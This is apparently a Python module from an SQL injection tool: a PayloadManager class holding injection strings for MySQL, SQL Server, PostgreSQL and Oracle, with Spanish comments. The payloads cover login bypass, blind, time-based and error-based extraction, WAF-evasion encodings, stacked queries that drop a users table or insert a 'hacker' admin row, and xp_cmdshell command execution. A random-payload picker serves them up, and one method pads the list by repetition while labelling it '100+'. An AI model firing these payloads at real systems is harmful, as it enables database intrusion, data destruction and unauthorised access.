import random

class PayloadManager:
    def __init__(self):
        self.payloads = {
            'mysql': self.load_mysql_payloads(),
            'mssql': self.load_mssql_payloads(),
            'pgsql': self.load_pgsql_payloads(),
            'oracle': self.load_oracle_payloads()
        }
    
    def load_mysql_payloads(self):
        """Payloads chingones para MySQL"""
        return [
            # Classic
            "' OR '1'='1",
            "' OR '1'='1' --",
            "' OR 1=1#",
            "' UNION SELECT NULL--",
            
            # Blind SQL
            "' AND SLEEP(5)--",
            "' OR IF(1=1, BENCHMARK(1000000,MD5('a')), 0)--",
            "' AND 1=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.TABLES)--",
            
            # Error based
            "' AND extractvalue(1, concat(0x7e, database()))--",
            "' AND updatexml(1, concat(0x7e, version()), 1)--",
            
            # Stacked queries
            "'; DROP TABLE users--",
            "'; INSERT INTO admin VALUES('hacker','pass')--",
            
            # Boolean based
            "' AND 1=1--",
            "' AND 1=2--",
            "' OR EXISTS(SELECT 1 FROM users)--",
            
            # Time based
            "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
            "' AND 1=(SELECT IF(1=1, SLEEP(5), 0))--",
            
            # Bypass WAF
            "'/**/OR/**/1=1--",
            "'%20OR%201=1--",
            "'%2527OR%25201=1--",
            "' OR 1=1 AND SLEEP(5)=0--",
            "'%20oR%201=1%23",
            "'||1='1",
            "' OR 1=1 LIMIT 1--",
            
            # Más avanzados
            "' UNION SELECT 1,2,3,4,5,6,7,8,9,10--",
            "' AND SUBSTRING(@@version,1,1)=5--",
            "' AND MID((SELECT user()),1,1)='r'--",
            "' AND (SELECT COUNT(*) FROM users) > 0--"
        ]
    
    def load_mssql_payloads(self):
        """Payloads para SQL Server"""
        return [
            "' OR '1'='1' --",
            "' WAITFOR DELAY '00:00:05'--",
            "' AND 1=CONVERT(int, @@version)--",
            "'; EXEC xp_cmdshell 'dir'--",
            "' UNION SELECT null,null,null WHERE 1=1--",
        ]
    
    def load_pgsql_payloads(self):
        """Payloads para PostgreSQL"""
        return [
            "' OR '1'='1' --",
            "' AND 1=CAST(pg_sleep(5) AS TEXT)--",
            "'; SELECT pg_sleep(5)--",
            "' UNION SELECT NULL, NULL, current_database()--",
        ]
    
    def load_oracle_payloads(self):
        """Payloads para Oracle"""
        return [
            "' OR '1'='1' --",
            "' AND 1=UTL_INADDR.get_host_address('google.com')--",
            "'; SELECT user FROM dual--",
            "' UNION SELECT null, null, banner FROM v$version--",
        ]
    
    def get_random_payload(self, db_type='mysql'):
        """Payload aleatorio para pruebas"""
        return random.choice(self.payloads.get(db_type, self.payloads['mysql']))
    
    def get_all_mysql_payloads(self):
        """Todos los payloads de MySQL (100+)"""
        return self.payloads['mysql'] * 3  # Simular 100+ repetidos
